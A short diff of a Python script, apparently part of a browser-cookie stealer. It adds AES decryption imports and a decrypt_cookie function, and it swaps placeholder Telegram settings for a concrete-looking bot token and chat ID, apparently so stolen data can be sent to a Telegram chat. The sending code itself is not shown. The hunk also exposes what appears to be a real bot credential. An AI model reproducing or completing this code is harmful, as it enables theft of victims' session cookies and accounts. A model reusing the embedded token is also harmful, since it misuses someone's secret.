@@ -7,8 +7,8 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 # Конфиг Telegram
-TELEGRAM_TOKEN = "ВАШ_ТОКЕН"  # Замените на реальный токен бота
-CHAT_ID = "ВАШ_CHAT_ID"       # Замените на реальный Chat ID
+TELEGRAM_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"  # Замените на реальный токен бота
+CHAT_ID = "1962231620"       # Замените на реальный Chat ID
 
 def decrypt_cookie(cookie, key):
     try:
